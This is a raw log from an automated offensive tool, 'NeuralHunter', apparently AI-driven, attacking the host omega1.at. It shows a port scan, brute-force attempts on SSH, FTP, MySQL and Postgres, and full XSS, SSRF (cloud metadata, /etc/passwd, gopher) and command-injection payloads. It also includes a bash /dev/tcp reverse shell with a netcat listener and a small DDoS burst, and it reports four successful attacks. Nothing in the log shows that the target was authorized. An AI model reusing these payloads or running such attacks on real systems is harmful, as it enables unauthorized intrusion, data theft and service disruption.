2025-11-04 18:55:36,426 - NeuralHunter - INFO - [bold magenta]НЕЙРОННЫЙ ЛОГЕР v10.1 АКТИВИРОВАН[/bold magenta]
2025-11-04 18:55:36,427 - NeuralHunter - INFO - [bold magenta]НЕЙРОННЫЙ ХАНТЕР v14.1 — 21 АТАКА[/bold magenta]
2025-11-04 18:55:36,431 - NeuralHunter - INFO - [bold cyan]ИИ: ИИ: NeuralBrain v14.1[/bold cyan]
2025-11-04 18:55:36,431 - NeuralHunter - INFO - ULTIMATE TOKEN HUNTER → http://omega1.at/FUZZ
2025-11-04 18:55:36,900 - NeuralHunter - INFO - [GET] http://omega1.at/ → 200
2025-11-04 18:55:36,903 - NeuralHunter - INFO - PORT SCAN → http://omega1.at/FUZZ
2025-11-04 18:55:36,910 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 21
2025-11-04 18:55:36,914 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 22
2025-11-04 18:55:36,918 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 80
2025-11-04 18:55:36,922 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 443
2025-11-04 18:55:36,926 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 8080
2025-11-04 18:55:36,930 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 8443
2025-11-04 18:55:36,934 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 3306
2025-11-04 18:55:36,938 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 5432
2025-11-04 18:55:36,941 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE[/bold cyan]
2025-11-04 18:56:25,294 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: POSTGRES_BRUTEFORCE[/bold cyan]
2025-11-04 18:56:56,903 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE[/bold cyan]
2025-11-04 18:56:56,905 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
2025-11-04 18:57:27,349 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: FTP_BRUTEFORCE[/bold cyan]
2025-11-04 18:58:15,736 - NeuralHunter - INFO - SQL INJECTION → http://omega1.at/FUZZ
2025-11-04 18:58:15,738 - NeuralHunter - ERROR - SQLi ошибка: 'TorClient' object has no attribute 'sync_request'
2025-11-04 18:58:15,739 - NeuralHunter - INFO - XSS АТАКА → http://omega1.at/FUZZ
2025-11-04 18:58:15,741 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%3Cscript%3Ealert%281%29%3C/script%3E
2025-11-04 18:58:16,208 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Cscript%3Ealert%281%29%3C/script%3E → 403
2025-11-04 18:58:16,211 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
2025-11-04 18:58:16,509 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E → 200
2025-11-04 18:58:16,510 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=javascript%3Aalert%281%29
2025-11-04 18:58:16,805 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=javascript%3Aalert%281%29 → 200
2025-11-04 18:58:16,807 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%3Csvg/onload%3Dalert%281%29%3E
2025-11-04 18:58:17,090 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Csvg/onload%3Dalert%281%29%3E → 200
2025-11-04 18:58:17,093 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%22%27%3E%3Cscript%3Ealert%281%29%3C/script%3E
2025-11-04 18:58:17,543 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%22%27%3E%3Cscript%3Ealert%281%29%3C/script%3E → 403
2025-11-04 18:58:17,545 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E
2025-11-04 18:58:18,007 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E → 403
2025-11-04 18:58:18,010 - NeuralHunter - INFO - CSRF АТАКА → http://omega1.at/FUZZ
2025-11-04 18:58:18,307 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ → 200
2025-11-04 18:58:18,308 - NeuralHunter - INFO - SSRF АТАКА → http://omega1.at/FUZZ
2025-11-04 18:58:18,310 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=http%3A//169.254.169.254/latest/meta-data/
2025-11-04 18:58:18,601 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=http%3A//169.254.169.254/latest/meta-data/ → 200
2025-11-04 18:58:18,603 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=http%3A//127.0.0.1%3A22
2025-11-04 18:58:18,900 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=http%3A//127.0.0.1%3A22 → 200
2025-11-04 18:58:18,903 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=file%3A///etc/passwd
2025-11-04 18:58:19,370 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=file%3A///etc/passwd → 403
2025-11-04 18:58:19,371 - NeuralHunter - WARNING - SSRF ЗАБЛОКИРОВАН: 403 на file:///etc/passwd
2025-11-04 18:58:19,373 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=file%3A///proc/version
2025-11-04 18:58:19,682 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=file%3A///proc/version → 200
2025-11-04 18:58:19,683 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=gopher%3A//127.0.0.1%3A3306/_%252e%252e
2025-11-04 18:58:19,958 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=gopher%3A//127.0.0.1%3A3306/_%252e%252e → 200
2025-11-04 18:58:19,960 - NeuralHunter - INFO - RCE АТАКА → http://omega1.at/FUZZ
2025-11-04 18:58:19,962 - NeuralHunter - INFO - RCE ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%3Bid
2025-11-04 18:58:20,259 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Bid → 200
2025-11-04 18:58:20,261 - NeuralHunter - INFO - RCE ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%7Cwhoami
2025-11-04 18:58:20,562 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%7Cwhoami → 200
2025-11-04 18:58:20,564 - NeuralHunter - INFO - RCE ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%24%28id%29
2025-11-04 18:58:21,018 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%24%28id%29 → 403
2025-11-04 18:58:21,022 - NeuralHunter - INFO - RCE НАЙДЕН: $(id)
2025-11-04 18:58:21,024 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: REVERSE_SHELL[/bold cyan]
2025-11-04 18:58:21,026 - NeuralHunter - INFO - REVERSE SHELL → http://omega1.at/FUZZ?FUZZ=%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/4444%200%3E%261%27
2025-11-04 18:58:21,028 - NeuralHunter - INFO - СЛУШАЙ: nc -lvnp 4444
2025-11-04 18:58:21,459 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/4444%200%3E%261%27 → 403
2025-11-04 18:58:21,462 - NeuralHunter - WARNING - SMART DDOS: 200 запросов → http://omega1.at/FUZZ (ТОЛЬКО НА СВОЙ СЕРВЕР!)
2025-11-04 18:59:27,411 - NeuralHunter - CRITICAL - [bold red]БРЕШЬ: УСПЕШНЫХ АТАК: 4/21[/bold red]
2025-11-04 18:59:27,414 - NeuralHunter - INFO - [bold cyan]ИИ: ИИ СОХРАНЁН: ai_brain.json[/bold cyan]
2025-11-04 18:59:27,422 - NeuralHunter - INFO - [bold green]УСПЕХ: ОТЧЁТ: 21 АТАКА, ДАМП, ТОКЕНЫ, DB_HACK[/bold green]
2025-11-04 18:59:27,423 - NeuralHunter - INFO - [bold cyan]ИИ: ЭВОЛЮЦИЯ...[/bold cyan]
2025-11-04 18:59:27,424 - NeuralHunter - CRITICAL - ОШИБКА: 'NoneType' object has no attribute 'start_evolution_loop'
